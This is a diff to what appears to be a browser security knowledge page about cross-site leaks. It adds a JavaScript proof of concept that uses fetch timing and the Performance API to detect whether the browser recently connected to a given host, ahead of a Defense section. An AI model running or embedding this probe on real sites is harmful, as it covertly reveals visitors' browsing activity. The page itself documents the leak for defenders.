@@ -41,8 +41,32 @@ This may also leak when the connection happened and the browser can have per con
 ```javascript
 // Detect if a HTTP/3 request was made to a certain host in the last 20 seconds.
 await new Promise(r => setTimeout(r, 10000));
-// Check for connection reuse (ideally fetch a small resource or one with Timing-Allow-Origin: * header)
 
+// Check for connection reuse (ideally fetch a small resource or one with Timing-Allow-Origin: * header)
+async function isConnected(url) {
+    await fetch(url, {
+        cache: "no-store",
+        mode: 'no-cors'
+    });
+    await new Promise(r => setTimeout(r, 1000));
+    let data = performance.getEntries().pop();
+    if (data.transferSize > 0) {
+        // Allowed to read timing infomation.
+        // Same-origin or the Timing-Allow-Origin header.
+        return (data.connectStart === data.startTime);
+    } else {
+        await fetch(url, {
+            cache: "no-store",
+            mode: 'no-cors'
+        });
+        await new Promise(r => setTimeout(r, 1000));
+        let data2 = performance.getEntries().pop();
+        // Check if the first request toke significantly longer.
+        return (data.duration - data2.duration < 100);
+    }
+}
+
+await isConnected('https://example.com/404');
 ```
 
 ## Defense
